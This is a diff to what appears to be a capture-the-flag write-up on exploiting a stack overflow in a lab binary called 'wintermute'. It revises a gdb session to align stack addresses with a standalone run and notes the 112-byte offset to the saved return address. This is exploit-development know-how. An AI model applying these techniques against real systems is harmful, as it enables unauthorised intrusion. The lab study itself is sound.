@@ -38,27 +38,18 @@ After further investigation, we found no simple `pop rdx ; ret` gadget, but we d
 
 ### Payload
 The only thing left is to find the address of the `query` buffer and update our payload accordingly.
-
+Once more we noticed (albeit a bit late) that `gdb` messes with another environment variable: `_`.
+It happened to be the case that in previous exercises all stack addresses aligned with what was seen in `gdb` however for this level we had to make sure that it's the exact same as if the executable would be called standalone.
 
 ``` bash
-gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS"
-(gdb) b run_query
-Breakpoint 1 at 0x401431
-(gdb) run < payload
-Starting program: /home/level05/wintermute < payload
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-  [WINTERMUTE] I am everywhere and nowhere.
-  [WINTERMUTE] Neural query interface active.
-
-Breakpoint 1, 0x0000000000401431 in run_query ()
-(gdb) si
-0x0000000000401435 in run_query ()
-(gdb) si
-0x000000000040143c in run_query ()                0
-(gdb) i r $rsp
-rsp            0x7fffffffe0a0      0x7fffffffe0a0
-(gdb)
+gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "set environment _=$PWD/wintermute" ./wintermute
+(gdb) b *0x401435
+Breakpoint 1 at 0x401435
+(gdb) r
+	...
+Breakpoint 1, 0x0000000000401435 in run_query ()
+(gdb) i r rsp
+rsp            0x7fffffffe090      0x7fffffffe090
 ```
 
 We also need to update our offsets to account for the added gadgets. The remaining task is to determine the offsets to reach `saved rbp` and `saved rip`. By inspecting the binary's `objdump`, we find that the function allocates `0x70` (112) bytes on the stack. Therefore, we need to fill the buffer with 112 bytes of junk to reach the saved `rbp` and `rip` addresses.
